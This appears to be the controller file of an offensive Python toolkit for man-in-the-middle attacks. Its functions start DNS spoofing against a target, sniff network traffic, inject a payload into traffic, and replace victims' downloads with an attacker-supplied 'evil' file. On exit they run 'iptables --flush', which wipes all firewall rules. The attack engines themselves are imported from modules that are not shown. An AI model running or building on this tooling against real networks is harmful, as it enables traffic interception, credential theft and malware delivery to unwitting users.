import re
import subprocess
from files import DNS_Spoofing
from files import Sniffer
from colorama import Fore
from files import code_injector
from files import replace_download_file

class general_function:
    def interfaces(self):
        result = str(subprocess.check_output("ip link show", shell=True))
        interface = re.findall(r"\s\w*(?=:\s)", str(result))
        return interface

    def router_ip(self):
        result = str(subprocess.check_output("route -n", shell=True))
        router_ip = re.findall("\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", str(result))
        return router_ip[1]

    def DNS_spoof(self, target_address, spoofed_address):
        spoof = DNS_Spoofing.DNS_spoofing(target_address, spoofed_address)
        try:
            print("CTRL+c to stop DNS Spoofing")
            spoof.run()
        except KeyboardInterrupt:
            subprocess.call("iptables --flush", shell=True)
            print(Fore.BLUE + "\nDNS Spoofing Stop"+ Fore.RESET)

    def sniff(self, interface, store, raw_data):
        sniffer = Sniffer.Sniffer(interface, store, True, raw_data)
        print("CTRL+c to stop Sniffing")
        sniffer.sniff()
        print(Fore.BLUE + "\nSNIFFING Stop" + Fore.RESET)

    def injector(self, parameter, payload):
        injection = code_injector.Code_injector(parameter,payload)
        try:
            print("CTRL+c to stop Code Injector")
            injection.run()
        except KeyboardInterrupt:
            subprocess.call("iptables --flush", shell=True)
            print(Fore.BLUE + "\nCode Injector Stop"+ Fore.RESET)

    def replace(self, evil_file_location, extension):
        replace = replace_download_file.Replace_file(evil_file_location, extension)
        try:
            print("CTRL+c to Relace file module")
            replace.run()
        except KeyboardInterrupt:
            subprocess.call("iptables --flush", shell=True)
            print(Fore.BLUE + "\nReplace file module Stop" + Fore.RESET)
